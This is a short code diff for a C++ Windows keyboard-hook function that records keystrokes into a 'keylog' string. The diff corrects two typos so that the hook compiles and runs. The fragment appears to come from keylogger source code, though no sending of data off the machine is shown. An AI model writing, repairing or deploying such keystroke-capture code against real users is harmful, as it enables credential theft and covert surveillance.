@@ -50,7 +50,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
     {
-        keylog += Keys::EKYS[kbs->vkCode].Name;
+        keylog += Keys::KEYS[kbs->vkCode].Name;
         if(kbs->vkCode == VK_RETURN)
             keylog += '\n';
     }
@@ -76,7 +76,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
             keylog += KeyName;
         }
     }
-    return CallNextHookEx(eHook, nCode, wparam, lparams);
+    return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
 bool InstallHook()
